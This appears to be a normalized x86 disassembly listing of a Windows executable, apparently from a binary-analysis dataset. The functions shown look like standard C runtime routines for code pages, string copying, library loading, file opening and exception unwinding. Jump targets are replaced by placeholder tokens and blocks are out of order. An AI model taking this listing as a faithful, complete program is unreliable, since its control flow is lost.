mov [ esi + rw-data ] al
inc esi
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41610f
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_40f691
pop ecx
sub_416145
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_415c8f
mov ebx eax
pop ecx
mov [ ebp - 0x20 ] ebx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov [ ebp - 0x1c ] ecx
mov eax edi
push esi
call sub_415cfb
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_412270
mov edx [ ebp - 0x1c ]
add esp 0xc
imul edx edx 0x30
lea eax [ edx + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40f682
leave
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
mov ebx [ ebp - 0x20 ]
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_415c55
add esp 0x4
mov [ esi + 0x21c ] eax
push 0x6
lea ecx [ esi + 0xc ]
lea edx [ edx + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx ebx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
mov [ ecx ] ax
lea edx [ edx + 0x2 ]
lea ecx [ ecx + 0x2 ]
dec edi
jne r-xdata
push esi
call sub_415d64
cmp ebx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp ebx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + ebx + 0x19 ] al
movzx eax [ ecx + 0x1 ]
inc ebx
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_412270
mov [ esi + 0x4 ] ebx
xor ebx ebx
inc ebx
add esp 0xc
mov [ esi + 0x21c ] edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_415cfb
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
push [ esi + 0x4 ]
call sub_415c55
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx ecx [ eax ]
movzx edx dl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_416340
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4163e4
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_410eb4
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov ebx ecx
mov edi eax
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ebx ] ax
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
movzx eax [ esi ]
mov [ ebx + esi ] ax
lea esi [ esi + 0x2 ]
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx ]
mov [ ebx ] ax
lea ebx [ ebx + 0x2 ]
test ax ax
je r-xdata
xor eax eax
mov [ ecx ] ax
call sub_410eb4
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_41179e
mov eax esi
sub_4164a2
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ EncodePointer@IAT ]
push esi
push edi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
xor edi edi
push edi
mov [ ebp - 0x20 ] eax
call ebx
mov esi eax
mov [ ebp - 0x18 ] esi
call sub_415392
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] edi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x800
push edi
push r--data
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
mov eax [ rw-data ]
mov ebx [ DecodePointer@IAT ]
cmp eax esi
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
push 0x3
jmp r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
push eax
call [ OutputDebugStringW@IAT ]
xor eax eax
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop eax
jmp r-xdata
push 0x4
mov esi [ ebp - 0x18 ]
push r--data
push esi
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
mov esi [ ebp + 0x10 ]
push eax
call ebx
test eax eax
je r-xdata
push eax
call ebx
push [ rw-data ]
mov [ ebp - 0x14 ] eax
call ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f682
leave
retn
push esi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push edi
call eax
jmp r-xdata
call eax
mov edi eax
test edi edi
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call ecx
test eax eax
je r-xdata
push eax
call ebx
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
or esi 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ ebp - 0x18 ]
test eax eax
je r-xdata
push edi
call eax
mov edi eax
push [ rw-data ]
call ebx
test eax eax
je r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_416684
push 0x10
push r--data
call sub_411a70
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_41569d
pop ecx
and [ ebp - 0x4 ] edi
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416718
mov eax edi
call sub_411ab5
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_410937
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_40f691
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
inc edi
mov [ ebp - 0x1c ] edi
sub_416721
push ebp
mov ebp esp
sub esp 0x1c
push esi
call sub_415392
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
or eax [ ebp + 0x20 ]
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
mov [ ebp - 0x1c ] 0x18
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
call sub_415392
test eax eax
mov eax [ ebp + 0x1c ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
sub_4167b2
push ebp
mov ebp esp
sub esp 0x38
push ebx
xor ebx ebx
test [ ebp + 0x14 ] 0x80
push edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x38 ] 0xc
mov [ ebp - 0x34 ] ebx
je r-xdata
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4117ae
int3
mov ecx [ ebp + 0x14 ]
mov eax 0x8000
test eax ecx
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_418861
pop ecx
test eax eax
jne r-xdata
mov eax ecx
and eax 0x3
mov edx 0xc0000000
sub eax ebx
je r-xdata
test ecx 0x74000
jne r-xdata
mov edi 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0xc ] ebx
sub eax esi
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub eax esi
je r-xdata
mov edi 0x40000000
jmp r-xdata
test ecx 0x70000
je r-xdata
mov edi edx
jmp r-xdata
call sub_410e80
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
call sub_410eb4
push 0x16
pop ebx
mov [ eax ] ebx
call sub_41179e
mov eax ebx
jmp r-xdata
xor esi esi
inc esi
cmp eax 0x600
je r-xdata
push 0x3
test eax eax
je r-xdata
mov eax ecx
and eax 0x700
mov esi 0x400
cmp eax esi
jg r-xdata
mov [ ebp - 0xc ] edx
jmp r-xdata
sub eax esi
je r-xdata
mov [ ebp - 0x8 ] edi
mov edi edx
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop ebx
leave
retn
test cl 0x40
je r-xdata
mov eax [ rw-data ]
not eax
and eax [ ebp + 0x1c ]
test al al
mov eax ebx
js r-xdata
push 0x5
jmp r-xdata
cmp eax 0x700
je r-xdata
mov edx 0x80
mov eax ebx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x10 ] eax
test ecx 0x100
je r-xdata
cmp eax 0x100
je r-xdata
mov [ ebp - 0xc ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
mov eax [ ebp + 0x18 ]
push esi
push 0x10
pop esi
push 0x2
pop edx
mov [ ebp - 0x28 ] edx
sub eax esi
je r-xdata
test ecx 0x1000
je r-xdata
or edi 0x10000
or [ ebp - 0xc ] 0x4
mov eax 0x4000000
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edi
xor edx edx
inc edx
mov [ ebp - 0x18 ] edx
pop esi
jmp r-xdata
call sub_410e80
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
call sub_410eb4
push 0x16
pop ebx
mov [ eax ] ebx
call sub_41179e
jmp r-xdata
push 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp edi 0x80000000
sete al
mov [ ebp - 0xc ] eax
jmp r-xdata
test ecx 0x2000
je r-xdata
or edx 0x100
mov [ ebp - 0x18 ] edx
mov eax ebx
jmp r-xdata
cmp eax 0x300
jne r-xdata
test cl 0x20
je r-xdata
or eax 0x2000000
mov [ ebp - 0x10 ] eax
pop esi
mov esi edx
jmp r-xdata
test cl 0x10
je r-xdata
or eax 0x8000000
jmp r-xdata
call sub_41788e
mov edi [ ebp + 0xc ]
mov [ edi ] eax
cmp eax 0xffffffff
jne r-xdata
or eax 0x10000000
mov [ ebp - 0x10 ] eax
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp - 0x18 ]
mov [ eax ] 0x1
push esi
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
call sub_416721
add esp 0x1c
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_410e80
mov [ eax ] ebx
or [ edi ] 0xffffffff
call sub_410eb4
mov [ eax ] 0x18
call sub_410eb4
mov eax [ eax ]
push eax
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx 0xc0000000
mov eax ecx
and eax edx
cmp eax edx
jne r-xdata
cmp eax 0x2
jne r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_410e93
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_410e93
test [ ebp + 0x14 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_410eb4
mov ebx [ eax ]
jmp r-xdata
call sub_410eb4
mov [ eax ] 0xd
jmp r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
push [ ebp - 0x18 ]
and ecx 0x7fffffff
push esi
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp + 0x10 ]
call sub_416721
add esp 0x1c
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ edi ]
call sub_417b20
mov dl [ ebp - 0x1 ]
pop ecx
pop ecx
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
or dl 0x1
mov [ eax + ecx + 0x4 ] dl
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
mov [ ebp - 0x1 ] dl
and [ eax + ecx + 0x24 ] 0x80
mov ecx [ ebp + 0x14 ]
mov al dl
and al 0x48
mov [ ebp - 0x3 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
test dl dl
jns r-xdata
test dl dl
jns r-xdata
mov edx [ edi ]
mov eax edx
sar eax 0x5
and edx 0x1f
mov ecx [ eax * 4 + rw-data ]
shl edx 0x6
mov al [ ecx + edx + 0x24 ]
xor al [ ebp - 0x2 ]
and al 0x7f
xor [ ecx + edx + 0x24 ] al
mov esi [ edi ]
mov ecx [ ebp + 0x14 ]
mov eax esi
sar eax 0x5
and esi 0x1f
mov edx [ eax * 4 + rw-data ]
shl esi 0x6
shr ecx 0x10
mov al [ edx + esi + 0x24 ]
shl cl 0x7
and al 0x7f
or cl al
mov [ edx + esi + 0x24 ] cl
mov ecx [ ebp + 0x14 ]
cmp [ ebp - 0x3 ] bl
jne r-xdata
test ecx 0x74000
jne r-xdata
test cl 0x2
je r-xdata
mov esi [ ebp - 0x8 ]
mov edx 0xc0000000
mov eax esi
and eax edx
cmp eax edx
jne r-xdata
test cl 0x8
je r-xdata
mov eax ecx
and eax 0x74000
cmp eax 0x4000
je r-xdata
mov eax [ ebp - 0x20 ]
and eax 0x74000
jne r-xdata
push 0x2
push 0xffffffff
push 0xffffffff
push [ edi ]
call sub_413f47
mov ecx eax
and ecx edx
add esp 0x10
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x14 ] edx
cmp ecx 0xffffffff
jne r-xdata
test cl 0x1
je r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
or [ eax + ecx + 0x4 ] 0x20
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or ecx eax
or ecx 0x4000
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ edi ]
mov [ ebp - 0x24 ] ebx
call sub_412408
add esp 0xc
test eax eax
jne r-xdata
call sub_410e80
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
push [ ebp - 0x18 ]
and esi 0x7fffffff
push 0x3
push eax
push [ ebp - 0xc ]
push esi
push [ ebp + 0x10 ]
call sub_416721
add esp 0x1c
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x14 ] ebx
test dl 0x40
jne r-xdata
mov eax ecx
and eax 0x301
cmp eax 0x301
jne r-xdata
cmp eax 0x14000
je r-xdata
mov [ ebp + 0x14 ] ecx
push ebx
push ebx
push ebx
push [ edi ]
call sub_413f47
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
mov dl [ ebp - 0x1 ]
mov ecx [ ebp + 0x14 ]
push [ edi ]
call sub_414467
jmp r-xdata
mov edx [ edi ]
mov ecx edx
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edx 0x6
mov [ edx + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_410e93
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
push [ edi ]
call sub_417a33
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test ecx 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x2c ]
push [ edi ]
call sub_4186ad
add esp 0xc
cmp eax 0xffffffff
je r-xdata
pop ecx
test esi esi
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
push 0x2
pop ecx
cmp esi ecx
jbe r-xdata
push 0x3
lea eax [ ebp - 0x14 ]
push eax
push [ edi ]
call sub_412408
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi ebx
dec eax
je r-xdata
cmp esi 0x4
ja r-xdata
mov ecx [ ebp - 0x14 ]
push 0x2
pop edx
cmp eax edx
je r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
push 0x3
pop ecx
mov [ ebp - 0x14 ] 0xbfbbef
mov [ ebp - 0x28 ] ecx
dec eax
jne r-xdata
cmp esi 0x5
je r-xdata
push ecx
push ebx
push ebx
push [ edi ]
call sub_413f47
add esp 0x10
or eax edx
je r-xdata
and ecx 0xffff
cmp ecx 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
push 0x2
pop ecx
cmp esi ecx
jbe r-xdata
mov ecx [ ebp - 0x28 ]
add esi eax
cmp ecx esi
jg r-xdata
mov [ ebp - 0x14 ] 0xfeff
jmp r-xdata
jmp r-xdata
push 0x2
pop ecx
push ebx
push ebx
push ebx
push [ edi ]
call sub_413f47
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
cmp ecx 0xfeff
jne r-xdata
push [ edi ]
call sub_414467
pop ecx
call sub_410eb4
push 0x16
pop ebx
mov [ eax ] ebx
jmp r-xdata
cmp ecx 0xbfbbef
jne r-xdata
cmp esi 0x4
jbe r-xdata
mov eax ecx
sub eax esi
push eax
lea eax [ ebp - 0x14 ]
add eax esi
push eax
push [ edi ]
call sub_413254
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push ebx
push edx
push [ edi ]
call sub_413f47
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push ecx
push ebx
push ebx
push [ edi ]
call sub_413f47
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ edi ]
call sub_413f47
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_416f10
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416f30
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40f682
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_416f75
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_416f75
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_416f30
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_417025
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_417044
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_41701c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_417025
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_417047
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_410eb4
mov [ eax ] 0x9
jmp r-xdata
call sub_410eb4
mov [ eax ] 0x9
call sub_41179e
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
movsx eax [ eax + ecx + 0x4 ]
and eax 0x40
pop ebp
retn
sub_41709b
push ebp
mov ebp esp
inc [ rw-data ]
push esi
mov esi 0x1000
push esi
call sub_412014
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] esi
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop esi
pop ebp
retn
sub_4170e1
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
cmp [ edi + 0x78 ] 0x0
je r-xdata
mov eax [ edi + 0x80 ]
test eax eax
je r-xdata
push [ edi + 0x78 ]
call esi
cmp [ edi + 0x7c ] 0x0
je r-xdata
push eax
call esi
mov eax [ edi + 0x88 ]
test eax eax
je r-xdata
push [ edi + 0x7c ]
call esi
push 0x6
pop eax
lea ebx [ edi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call esi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call esi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0x9c ]
add eax 0xb0
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push [ ebx - 0x4 ]
call esi
mov eax [ ebp + 0x8 ]
sub_417171
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0x84 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
lea edi [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_40f691
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_40f691
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_40f691
push [ esi + 0x88 ]
call sub_40f691
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_418abb
push [ esi + 0x9c ]
call sub_40f691
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
